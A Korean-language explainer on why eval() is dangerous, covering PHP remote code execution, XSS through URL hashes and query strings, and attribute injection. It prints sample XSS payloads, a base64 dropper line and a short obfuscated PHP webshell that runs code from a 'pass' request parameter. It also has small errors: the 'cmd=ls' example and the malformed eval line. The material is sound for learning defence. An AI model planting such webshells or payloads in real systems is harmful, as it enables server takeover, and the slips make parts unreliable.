## **🔍 `eval()`의 위험성 및 분류**

### **`eval()`이란?**

`eval()`은 주어진 문자열을 코드로 실행하는 함수입니다. 주로 **PHP**, **JavaScript** 같은 언어에서 사용되며, 서버나 클라이언트에서 동적으로 코드를 실행할 수 있게 해 줍니다. 하지만 **악용될 경우** 보안에 심각한 문제를 일으킬 수 있습니다.

| 용어                              | 설명                                                        |
| ------------------------------- | --------------------------------------------------------- |
| **XSS (Cross-Site Scripting)**  | 자바스크립트 코드가 브라우저에서 실행됨                                     |
| **RCE (Remote Code Execution)** | 서버 측에서 임의의 코드가 실행됨                                        |
| **eval()**                      | 브라우저에서도 쓰이고, PHP 같은 서버언어에서도 쓰이는 **실행 함수**                 |
| **Attribute Injection**         | HTML 속성(attribute)에 악성 코드가 삽입됨 (ex: `onerror="alert(1)"`) |

---

### **📡 서버 측에서 `eval()` → RCE (Remote Code Execution)** (PHP, Node.js 등)

`eval()`을 **서버 측**에서 사용하면 **Remote Code Execution (RCE)** 공격에 취약해질 수 있습니다. 서버에서 실행되는 코드가 외부 입력에 의존하게 되면, 공격자는 **서버에서 임의의 코드를 실행**할 수 있습니다.


```php
eval($_GET['cmd']);  // 위험한 RCE
```

* 이 코드는 사용자가 HTTP 요청으로 `cmd` 파라미터를 보내면, 그 값을 코드로 실행합니다.
* 예를 들어, `http://example.com/?cmd=ls`와 같은 요청이 들어오면, 서버에서 **`ls` 명령어**가 실행됩니다. 이는 **XSS가 아니라 RCE** 공격입니다.

#### **이중 인코딩된 웹쉘**:

```php
eval(base64_decode('...'));
```

* \*\*`base64`\*\*로 인코딩된 코드를 **디코딩**하여 실행하는 예시입니다. 디코딩된 코드는 웹쉘일 가능성이 높습니다.
* 이 방식은 웹쉘을 숨기고 우회하는 데 자주 사용됩니다.
* 시나리오는 다음과 같습니다.
  
| 항목     | 내용                                              |
| ------ | ----------------------------------------------- |
| **목적** | 서버에 `baker.php`라는 파일 생성                         |
| **내용** | `baker.php` 안에 **base64 인코딩된 PHP 코드** 삽입        |
| **기능** | `eval()`, `base64_decode()` 이용한 원격 명령 실행 백도어 설치 |
| **결과** | 공격자가 `baker.php?pass=...`와 같은 요청으로 **명령 실행 가능** |

---

### **🌐 클라이언트 측 HTML에서 `eval()` → XSS (Cross-Site Scripting)**

클라이언트 측에서는 `eval()`을 악용하여 **XSS** 공격을 할 수 있습니다.

```html
<script>
eval(location.hash.slice(1)); // location.hash에 따라 JS 실행
</script>
```

* 이 코드는 사용자가 **URL의 해시값**을 `eval()`을 통해 실행하게 합니다.
* **URL의 해시값 (hash value)**은 URL의 # 뒤에 오는 부분을 의미합니다. 보통 웹 페이지 내에서 특정 위치나 요소로 **"이동"**하거나, 상태를 추적하는 데 사용합니다.
* 예를 들어, `#alert(1)`을 URL에 추가하면 `alert(1)`이 실행됩니다.
* 이는 **XSS** 공격으로, 사용자가 의도하지 않은 자바스크립트가 실행됩니다.

---

### **✒️ Attribute Injection으로의 활용**

만약 `eval()`이 **HTML 속성**에 삽입된다면, **Attribute Injection** 형태로 XSS 공격이 발생할 수 있습니다. 이는 HTML 태그 내 속성에 악성 코드를 삽입하는 공격입니다.

```html
<img src="x" onerror="eval(alert('XSS'))">
```

* 위 코드에서 `eval()`은 `<img>` 태그의 `onerror` 속성에 삽입되어 있습니다.
* 사용자가 이미지를 로드하지 못했을 때 (에러가 발생하면) `eval(alert('XSS'))`가 실행됩니다.
* 이 경우는 **Attribute Injection**을 통한 **XSS** 공격입니다.

> **Attribute Injection**은 **HTML 속성에 코드가 삽입되는 경우**에 해당합니다. 즉, `eval()`이 사용되더라도 위치에 따라 XSS의 **하위 유형**으로 분류될 수 있습니다.


---

### ✅`eval()`과 `new Function()`은 JavaScript에서 **동적 코드 실행**을 가능하게 하는 기능입니다. 이 기능을 악용하면 **XSS (Cross-Site Scripting)** 공격을 유발할 수 있습니다. 특히 공격자가 악성 스크립트를 주입하여 사이트의 취약점을 악용하거나 **사용자 데이터를 탈취**할 수 있습니다.

#### XSS 공격 예시: `eval()`과 `new Function()`을 통한 동적 코드 실행

#### 1. **`eval()`을 사용한 XSS 공격**

`eval()`은 문자열을 코드로 실행할 수 있는 기능을 제공합니다. 만약 `eval()`이 사용자 입력을 처리하는 코드에 포함되어 있다면, 악의적인 사용자가 해당 입력을 **JavaScript 코드**로 실행시킬 수 있습니다.

##### 예시:

만약 웹 애플리케이션이 URL 쿼리 매개변수 또는 사용자 입력을 `eval()`로 처리한다고 가정할 때, 공격자는 다음과 같은 **악성 페이로드**를 삽입할 수 있습니다.

```javascript
// 사용자 입력을 eval()로 실행하는 코드
var userInput = "alert('XSS Attack!');";  // 실제 공격자가 입력한 값
eval(userInput);
```

**악의적인 입력**:

```plaintext
javascript:alert('XSS'); // URL에서 사용될 수 있음
```

위와 같은 입력이 실행되면 **알림창**(`alert`)이 나타나는데, 이는 공격자가 **자바스크립트 코드**를 실행하게 만든 것입니다.

#### 2. **`new Function()`을 사용한 XSS 공격**

`new Function()`은 동적으로 **JavaScript 함수를 생성**하고, 이를 **실행**하는 방식입니다. 이 또한 **동적 코드 실행**을 가능하게 하여 XSS 공격에 취약할 수 있습니다.

##### 예시:

```javascript
// 사용자 입력을 new Function()으로 실행하는 코드
var userInput = "alert('XSS Attack!');";  // 실제 공격자가 입력한 값
var maliciousFunc = new Function(userInput);
maliciousFunc();
```

**악의적인 입력**:

```plaintext
alert('XSS');  // 사용자 입력값으로 주입되는 악성 스크립트
```

#### 3. **URL을 통한 XSS 공격**

`eval()`이나 `new Function()`을 사용하는 웹 애플리케이션에서, **URL의 쿼리 파라미터**를 통해 악성 JavaScript 코드를 주입할 수 있습니다.

##### 예시:

웹 애플리케이션에서 `eval()`을 사용하여 URL의 쿼리 매개변수 값을 처리하는 코드가 있을 수 있습니다.

```javascript
var userInput = getParameterByName('input');  // URL에서 쿼리 파라미터 가져오기
eval(userInput);
```

* URL 쿼리 파라미터 `input`에 **악성 스크립트**가 포함되면, 이를 \*\*eval()\*\*을 통해 실행시킬 수 있습니다.

**악의적인 URL 예시**:

```plaintext
https://example.com/?input=alert('XSS');
```

위 URL에 접속하면 `eval()`이 `"alert('XSS')"`를 실행하여 **알림창**을 띄우는 결과가 발생합니다.

#### 4. **`document.location`을 통한 XSS**

만약 `eval()`이나 `new Function()`을 사용하여 **URL을 동적으로 처리**하고 있다면, 공격자는 `document.location`을 악용하여 자신이 원하는 JavaScript를 실행시킬 수 있습니다.

##### 예시:

```javascript
var userInput = document.location.hash.substring(1);  // URL 해시(#)에서 값 추출
eval(userInput);  // 동적으로 JavaScript 실행
```

**악의적인 URL 예시**:

```plaintext
https://example.com/#alert('XSS');
```

위 URL을 통해 `#alert('XSS')`가 실행되며, **XSS 공격**이 발생합니다.

---

## **📌 예시 코드 1: base64 디코딩 후 `eval()` 실행**

```php
eval(base64_decode('...'));
```

* 이 코드는 **base64로 인코딩된 코드**를 디코딩하여 실행합니다.
* **디코딩된 코드**는 웹쉘일 가능성이 높고, 이 방식은 **웹쉘 우회 기법**으로 자주 사용됩니다.

#### **디코딩된 코드 예시**:

```php
file_put_contents('baker.php', base64_decode('PD9waHAgY2xhcz0NFNDkzRjYYgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEh5NUY3...'))
```

* 위 코드는 \*\*`file_put_contents`\*\*를 사용하여 서버에 `baker.php` 파일을 생성하고, **다시 base64로 인코딩된 PHP 웹쉘**을 그 파일에 저장합니다.
* **웹쉘**을 서버에 설치하여 원격으로 명령을 실행할 수 있게 됩니다.

---

## **📌 예시 코드 2: 난독화된 PHP 코드와 `eval()`**

```php
<?php
class GcE493F6 {
    public function __construct($Hy5F7){
        @eval(.$Hy5F7.);
    }
}
new GcE493F6($_REQUEST['pass']);
echo error303;
?>
```

#### **코드 설명**:

| 줄                                     | 설명                                                      |
| ------------------------------------- | ------------------------------------------------------- |
| `class GcE493F6 { ... }`              | `GcE493F6`라는 클래스 정의 (이름은 무작위로 보이지만 난독화된 것)              |
| `public function __construct($Hy5F7)` | 클래스가 생성될 때 자동 실행되는 **생성자 함수**                           |
| `@eval(.$Hy5F7.);`                    | `$Hy5F7`에 들어온 문자열을 **PHP 코드로 실행** → `eval()` 사용         |
| `new GcE493F6($_REQUEST['pass']);`    | `$_REQUEST['pass']` 값으로 객체를 생성하며, **그 값이 곧 실행됨**        |
| `echo error303;`                      | 존재하지 않는 상수 `error303` 출력 → PHP Notice 또는 오류 유도 (종료 확인용) |

* \*\*`eval($_REQUEST['pass']);`\*\*는 사용자가 **HTTP 요청**으로 보낸 **문자열**을 PHP 코드처럼 실행하는 방식입니다. 이는 **XSS**나 **RCE** 공격의 가능성을 염두에 두고 취약점이 됩니다.

